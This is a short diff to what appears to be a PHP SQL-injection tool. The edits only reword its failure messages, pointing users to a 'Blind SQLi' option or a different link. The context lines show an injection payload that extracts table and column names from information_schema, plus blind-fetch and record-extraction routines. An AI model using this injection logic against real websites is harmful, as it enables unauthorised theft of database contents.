@@ -76,7 +76,7 @@ switch ($option) {
             $_SESSION["target"] = serialize($target);
             $_SESSION["scanner"] = serialize($scanner);
         } catch(Exception $e) {
-            _print("Cannot fetch database information..");
+            _print("Cannot fetch database information.. Try 'Blind SQLi' option.");
         }
         $stop = round(microtime(true) - $timer,2);
         _print($msg." Elapsed time (".$stop." sec)",$result);
@@ -99,7 +99,7 @@ switch ($option) {
             $tblSchemas = $scanner->get_exploit("concat(table_name,column_name)", "information_schema.columns", "table_name=(select+table_name+from+information_schema.tables+where+table_schema=database()", true);
             $scanner->site->set_tblSchemas($tblSchemas);
             if (empty($tblSchemas)) {
-                _print(" Failed to get any schemas..");
+                _print(" Failed to get any schemas.. Try 'Blind SQLi' option.");
                 exit;
             }
             
@@ -112,7 +112,7 @@ switch ($option) {
         } else {
             $tblSchemas = $scanner->blind_fetch();
             if ($tblSchemas == false) {
-                _print(" Failed to get any schemas..");
+                _print(" Failed to get any schemas.. Try a different link.");
                 exit;
             } else {
                 foreach ($tblSchemas as $tKey => $tblSchema) {
@@ -176,6 +176,6 @@ switch ($option) {
             }
         }
         $stop = round(microtime(true) - $timer,2);
-        isset($recordsData) ? _print($msg." Elapsed time (".$stop." sec)", $result) : _print(" Cannot get any record..");
+        isset($recordsData) ? _print($msg." Elapsed time (".$stop." sec)", $result) : _print(" Cannot get any records.. Try 'Blind SQLi' option.");
         exit;
 }
